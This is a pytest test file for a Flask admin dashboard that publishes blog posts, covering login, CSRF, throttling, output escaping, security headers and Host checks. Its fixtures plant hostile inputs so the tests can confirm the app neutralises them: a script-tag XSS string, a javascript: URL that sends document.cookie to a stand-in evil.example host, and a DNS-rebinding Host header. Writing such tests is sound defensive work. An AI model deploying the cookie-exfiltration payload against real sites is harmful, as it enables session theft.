"""관리자 대시보드 라우트 — 인증, CSRF, 목록/상세, 수동 발행 작업."""
from __future__ import annotations

import re
import threading

import pytest
from werkzeug.security import generate_password_hash

from src.application.use_cases.list_posts import ListPostsUseCase
from src.application.use_cases.publish_selected_post import (
    ManualPublishOutcome,
    ManualPublishResult,
)
from src.domain.entities.post import Post
from src.domain.value_objects.post_content import PostContent
from src.domain.value_objects.post_status import PostStatus
from src.infrastructure.persistence.in_memory_repo import InMemoryPostRepository
from src.interface.web.app import create_app
from src.interface.web.auth import AdminAuthenticator, LoginThrottle
from src.interface.web.jobs import PublishJobRunner

PASSWORD = "correct horse battery"


def _post(row, keyword, status=PostStatus.PENDING, body_len=3500):
    return Post(
        row_index=row, keyword=keyword, status=status,
        content=PostContent(title=f"{keyword} 제목", body_markdown="x" * body_len,
                            meta_description="요약"),
        quality_score=90,
    )


class Harness:
    def __init__(self, publish=None, allowed_hosts=None):
        self.published_rows: list[int] = []
        published = _post(4, "Kafka 입문", PostStatus.PUBLISHED)
        published.published_url = "https://blog.tistory.com/4"
        hostile = _post(5, "악성 URL", PostStatus.PUBLISHED)
        hostile.published_url = "javascript:fetch('https://evil.example/'+document.cookie)"
        repo = InMemoryPostRepository([
            _post(2, "OpenTelemetry 구축"),
            _post(3, "Istio <script>alert(1)</script>", body_len=10),
            published,
            hostile,
        ])

        def default_publish(row: int) -> ManualPublishResult:
            self.published_rows.append(row)
            return ManualPublishResult(ManualPublishOutcome.PUBLISHED, row, "발행 완료",
                                       url=f"https://blog.tistory.com/{row}")

        self.runner = PublishJobRunner(publish=publish or default_publish)
        app = create_app(
            authenticator=AdminAuthenticator("admin", generate_password_hash(PASSWORD)),
            list_posts=ListPostsUseCase(repo),
            job_runner=self.runner,
            secret_key="test-secret-key-0123456789",
            throttle=LoginThrottle(max_attempts=3, window_seconds=600),
            allowed_hosts=allowed_hosts,
        )
        app.config["TESTING"] = True
        self.client = app.test_client()

    def csrf(self, path: str = "/login") -> str:
        html = self.client.get(path).get_data(as_text=True)
        match = re.search(r'name="csrf_token" value="([^"]+)"', html)
        assert match, f"CSRF 토큰 없음: {path}"
        return match.group(1)

    def login(self, password: str = PASSWORD, username: str = "admin"):
        return self.client.post("/login", data={
            "username": username, "password": password, "csrf_token": self.csrf(),
        })


@pytest.fixture
def h() -> Harness:
    return Harness()


class TestAuthentication:
    @pytest.mark.parametrize("path", ["/", "/posts/2", "/jobs/abc"])
    def test_로그인_전에는_로그인_페이지로_이동(self, h, path):
        resp = h.client.get(path)
        assert resp.status_code == 302
        assert resp.headers["Location"].startswith("/login")

    def test_로그인_성공(self, h):
        resp = h.login()
        assert resp.status_code == 302
        assert resp.headers["Location"] == "/"
        assert h.client.get("/").status_code == 200

    def test_잘못된_비밀번호(self, h):
        resp = h.login(password="nope")
        assert resp.status_code == 401
        assert "올바르지 않" in resp.get_data(as_text=True)
        assert h.client.get("/").status_code == 302

    def test_반복_실패시_차단(self, h):
        for _ in range(3):
            h.login(password="nope")
        resp = h.login()  # 올바른 비밀번호여도 차단 중
        assert resp.status_code == 429

    def test_CSRF_토큰_없는_로그인_거부(self, h):
        resp = h.client.post("/login", data={"username": "admin", "password": PASSWORD})
        assert resp.status_code == 400

    def test_로그아웃(self, h):
        h.login()
        resp = h.client.post("/logout", data={"csrf_token": h.csrf("/")})
        assert resp.status_code == 302
        assert h.client.get("/").status_code == 302


class TestDashboard:
    def test_목록과_상태_개수(self, h):
        h.login()
        html = h.client.get("/").get_data(as_text=True)
        assert "OpenTelemetry 구축" in html
        assert "Kafka 입문" in html
        assert "발행대기" in html

    def test_상태_필터와_검색(self, h):
        h.login()
        html = h.client.get("/?status=발행완료").get_data(as_text=True)
        assert "Kafka 입문" in html
        assert "OpenTelemetry 구축" not in html
        html = h.client.get("/?q=opentelemetry").get_data(as_text=True)
        assert "OpenTelemetry 구축" in html
        assert "Kafka 입문" not in html

    def test_알수없는_상태값은_전체로_처리(self, h):
        h.login()
        assert h.client.get("/?status=hacked").status_code == 200

    def test_사용자_데이터는_이스케이프(self, h):
        h.login()
        html = h.client.get("/").get_data(as_text=True)
        assert "<script>alert(1)</script>" not in html
        assert "&lt;script&gt;" in html

    def test_상세_페이지에_발행_불가_사유(self, h):
        h.login()
        html = h.client.get("/posts/3").get_data(as_text=True)
        assert "3000" in html
        assert 'action="/posts/3/publish"' not in html

    def test_발행_가능한_게시물은_발행_버튼(self, h):
        h.login()
        html = h.client.get("/posts/2").get_data(as_text=True)
        assert 'action="/posts/2/publish"' in html

    def test_없는_게시물은_404(self, h):
        h.login()
        assert h.client.get("/posts/999").status_code == 404


class TestManualPublish:
    def test_발행_요청은_작업_페이지로_이동하고_결과_표시(self, h):
        h.login()
        resp = h.client.post("/posts/2/publish", data={"csrf_token": h.csrf("/posts/2")})
        assert resp.status_code == 302
        job_id = resp.headers["Location"].rsplit("/", 1)[-1]
        h.runner.wait(job_id, timeout=5)
        html = h.client.get(f"/jobs/{job_id}").get_data(as_text=True)
        assert "발행 완료" in html
        assert "https://blog.tistory.com/2" in html
        assert h.published_rows == [2]

    def test_CSRF_없는_발행_요청_거부(self, h):
        h.login()
        assert h.client.post("/posts/2/publish").status_code == 400
        assert h.published_rows == []

    def test_진행중_작업이_있으면_새_발행_거부(self):
        release = threading.Event()

        def slow(row):
            release.wait(5)
            return ManualPublishResult(ManualPublishOutcome.PUBLISHED, row, "발행 완료")

        h = Harness(publish=slow)
        h.login()
        token = h.csrf("/posts/2")
        first = h.client.post("/posts/2/publish", data={"csrf_token": token})
        second = h.client.post(
            "/posts/2/publish", data={"csrf_token": token}, follow_redirects=True,
        )
        assert "이미 진행 중" in second.get_data(as_text=True)
        release.set()
        h.runner.wait(first.headers["Location"].rsplit("/", 1)[-1], timeout=5)

    def test_실행중_작업_페이지는_자동_새로고침(self):
        release = threading.Event()

        def slow(row):
            release.wait(5)
            return ManualPublishResult(ManualPublishOutcome.PUBLISHED, row, "발행 완료")

        h = Harness(publish=slow)
        h.login()
        resp = h.client.post("/posts/2/publish", data={"csrf_token": h.csrf("/posts/2")})
        job_path = resp.headers["Location"]
        html = h.client.get(job_path).get_data(as_text=True)
        assert 'http-equiv="refresh"' in html
        release.set()
        h.runner.wait(job_path.rsplit("/", 1)[-1], timeout=5)

    def test_없는_작업은_404(self, h):
        h.login()
        assert h.client.get("/jobs/unknown").status_code == 404


class TestSecurityHeaders:
    def test_보안_헤더(self, h):
        resp = h.client.get("/login")
        assert "default-src 'self'" in resp.headers["Content-Security-Policy"]
        assert resp.headers["X-Frame-Options"] == "DENY"
        assert resp.headers["X-Content-Type-Options"] == "nosniff"
        assert "no-store" in resp.headers["Cache-Control"]

    def test_세션_쿠키_플래그(self, h):
        resp = h.login()
        cookie = resp.headers.get("Set-Cookie", "")
        assert "HttpOnly" in cookie
        assert "SameSite=Strict" in cookie

    def test_http_https가_아닌_URL은_링크로_렌더링하지_않음(self, h):
        h.login()
        for path in ("/", "/posts/5"):
            html = h.client.get(path).get_data(as_text=True)
            assert 'href="javascript:' not in html, path
        detail = h.client.get("/posts/4").get_data(as_text=True)
        assert 'href="https://blog.tistory.com/4"' in detail

    def test_허용되지_않은_Host_헤더_거부(self):
        h = Harness(allowed_hosts=frozenset({"127.0.0.1:8787"}))
        assert h.client.get("/login", headers={"Host": "127.0.0.1:8787"}).status_code == 200
        rebound = h.client.get("/login", headers={"Host": "rebind.evil.example:8787"})
        assert rebound.status_code == 400

    def test_favicon은_로그인_없이_빈_응답(self, h):
        assert h.client.get("/favicon.ico").status_code == 204


class TestJobResultUrl:
    def test_작업_결과의_비정상_URL은_링크로_렌더링하지_않음(self):
        def hostile(row):
            return ManualPublishResult(
                ManualPublishOutcome.PUBLISHED, row, "발행 완료", url="javascript:alert(1)",
            )

        h = Harness(publish=hostile)
        h.login()
        resp = h.client.post("/posts/2/publish", data={"csrf_token": h.csrf("/posts/2")})
        job_path = resp.headers["Location"]
        h.runner.wait(job_path.rsplit("/", 1)[-1], timeout=5)
        assert 'href="javascript:' not in h.client.get(job_path).get_data(as_text=True)
